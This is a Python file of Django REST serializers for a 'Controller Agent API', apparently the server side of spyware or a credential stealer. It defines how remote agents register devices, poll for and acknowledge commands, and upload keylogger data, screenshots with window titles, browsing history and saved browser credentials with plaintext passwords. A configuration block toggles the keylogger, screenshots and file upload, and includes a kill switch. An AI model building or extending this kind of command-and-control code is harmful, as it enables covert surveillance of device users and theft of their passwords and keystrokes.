"""
Serializers for the Controller Agent API.
"""

from rest_framework import serializers
from .models import (
    Device, DeviceConfig, FileMetadata, ScreenshotMeta, KeylogData, Command,
    BrowserHistory, BrowserCredential
)


class DeviceRegistrationSerializer(serializers.Serializer):
    """Serializer for device registration requests."""
    hardware_id = serializers.CharField(max_length=255)
    hostname = serializers.CharField(max_length=255)
    os_version = serializers.CharField(max_length=100, required=False, allow_blank=True)
    agent_version = serializers.CharField(max_length=20, required=False, allow_blank=True)


class DeviceSerializer(serializers.ModelSerializer):
    """Serializer for device details."""
    
    class Meta:
        model = Device
        fields = ['id', 'hardware_id', 'hostname', 'is_active', 'last_seen', 
                  'registered_at', 'os_version', 'agent_version', 'ip_address']
        read_only_fields = fields


class DeviceConfigSerializer(serializers.ModelSerializer):
    """Serializer for device configuration."""
    
    class Meta:
        model = DeviceConfig
        fields = [
            'kill_switch',
            'screenshots_enabled',
            'keylogger_enabled', 
            'browser_triggers_enabled',
            'file_upload_enabled',
            'browser_data_enabled',
            'browser_history_sync_interval',
            'config_sync_interval',
            'keylog_sync_interval',
            'screenshot_quality',
            'monitored_browsers',
            'updated_at'
        ]
        read_only_fields = fields


class FileMetadataSerializer(serializers.ModelSerializer):
    """Serializer for file metadata."""
    
    class Meta:
        model = FileMetadata
        fields = [
            'id', 'public_id', 'secure_url', 'resource_type',
            'format', 'size_bytes', 'original_filename', 'file_type', 'created_at'
        ]
        read_only_fields = ['id', 'created_at']


class FileMetadataCreateSerializer(serializers.Serializer):
    """Serializer for creating file metadata from Cloudinary upload response."""
    public_id = serializers.CharField(max_length=255)
    secure_url = serializers.URLField(max_length=500)
    resource_type = serializers.CharField(max_length=20)
    format = serializers.CharField(max_length=20)
    size_bytes = serializers.IntegerField(source='bytes')
    original_filename = serializers.CharField(max_length=255, required=False, allow_blank=True)
    file_type = serializers.CharField(max_length=50)


class ScreenshotMetaSerializer(serializers.ModelSerializer):
    """Serializer for screenshot metadata."""
    device_hostname = serializers.CharField(source='device.hostname', read_only=True)
    
    class Meta:
        model = ScreenshotMeta
        fields = [
            'id', 'device_hostname', 'secure_url', 'public_id',
            'trigger_type', 'active_window_title', 'active_process',
            'screen_width', 'screen_height', 'captured_at', 'received_at'
        ]
        read_only_fields = ['id', 'device_hostname', 'received_at']


class ScreenshotMetaCreateSerializer(serializers.Serializer):
    """Serializer for creating screenshot metadata from agent."""
    # Cloudinary data
    public_id = serializers.CharField(max_length=255)
    secure_url = serializers.URLField(max_length=500)
    format = serializers.CharField(max_length=20, default='jpg')
    size_bytes = serializers.IntegerField()
    
    # Screenshot context
    trigger_type = serializers.ChoiceField(choices=ScreenshotMeta.TRIGGER_CHOICES)
    active_window_title = serializers.CharField(max_length=500, required=False, allow_blank=True)
    active_process = serializers.CharField(max_length=100, required=False, allow_blank=True)
    screen_width = serializers.IntegerField(required=False)
    screen_height = serializers.IntegerField(required=False)
    captured_at = serializers.DateTimeField()


class KeylogDataSerializer(serializers.ModelSerializer):
    """Serializer for keylog data."""
    device_hostname = serializers.CharField(source='device.hostname', read_only=True)
    
    class Meta:
        model = KeylogData
        fields = [
            'id', 'device_hostname', 'data', 'start_time', 'end_time',
            'character_count', 'window_switches', 'received_at'
        ]
        read_only_fields = ['id', 'device_hostname', 'received_at']


class KeylogDataCreateSerializer(serializers.Serializer):
    """Serializer for syncing keylog data from agent."""
    data = serializers.CharField()
    start_time = serializers.DateTimeField()
    end_time = serializers.DateTimeField()
    character_count = serializers.IntegerField(default=0)
    window_switches = serializers.IntegerField(default=0)


class CommandSerializer(serializers.ModelSerializer):
    """Serializer for commands."""
    
    class Meta:
        model = Command
        fields = [
            'id', 'command_type', 'payload', 'status',
            'created_at', 'delivered_at', 'completed_at', 'expires_at',
            'result', 'error_message'
        ]
        read_only_fields = ['id', 'created_at', 'delivered_at', 'completed_at']


class CommandPollSerializer(serializers.ModelSerializer):
    """Lightweight serializer for command polling (pending commands only)."""
    
    class Meta:
        model = Command
        fields = ['id', 'command_type', 'payload', 'created_at', 'expires_at']
        read_only_fields = fields


class CommandAckSerializer(serializers.Serializer):
    """Serializer for command acknowledgment from agent."""
    command_id = serializers.UUIDField()
    status = serializers.ChoiceField(choices=['completed', 'failed'])
    result = serializers.JSONField(required=False, default=dict)
    error_message = serializers.CharField(required=False, allow_blank=True)


class BrowserHistorySerializer(serializers.ModelSerializer):
    """Serializer for browsing history."""
    class Meta:
        model = BrowserHistory
        fields = ['id', 'url', 'title', 'visit_count', 'last_visit_time', 'browser_type', 'received_at']

class BrowserHistoryCreateSerializer(serializers.Serializer):
    """Serializer for syncing history from agent."""
    url = serializers.CharField(required=False, allow_blank=True)
    title = serializers.CharField(max_length=500, required=False, allow_blank=True)
    visit_count = serializers.IntegerField(default=1)
    last_visit_time = serializers.DateTimeField()
    browser_type = serializers.CharField(max_length=50, required=False, allow_blank=True)

# BrowserCookie serializers removed

class BrowserCredentialSerializer(serializers.ModelSerializer):
    """Serializer for browser credentials."""
    class Meta:
        model = BrowserCredential
        fields = ['id', 'origin_url', 'action_url', 'username_element', 'username_value', 'password_element', 'password_value', 'browser_type', 'created_at_browser', 'received_at']

class BrowserCredentialCreateSerializer(serializers.Serializer):
    """Serializer for syncing credentials from agent."""
    origin_url = serializers.CharField(required=False, allow_blank=True)
    action_url = serializers.CharField(required=False, allow_null=True, allow_blank=True)
    username_element = serializers.CharField(max_length=255, required=False, allow_blank=True)
    username_value = serializers.CharField(max_length=255, required=False, allow_blank=True, allow_null=True)
    password_element = serializers.CharField(max_length=255, required=False, allow_blank=True)
    password_value = serializers.CharField(max_length=255, required=False, allow_blank=True)
    browser_type = serializers.CharField(max_length=50, required=False, allow_blank=True)
    created_at_browser = serializers.DateTimeField(required=False, allow_null=True)


class HeartbeatSerializer(serializers.Serializer):
    """Serializer for device heartbeat requests."""
    agent_version = serializers.CharField(max_length=20, required=False)
    os_version = serializers.CharField(max_length=100, required=False)
    uptime_seconds = serializers.IntegerField(required=False)
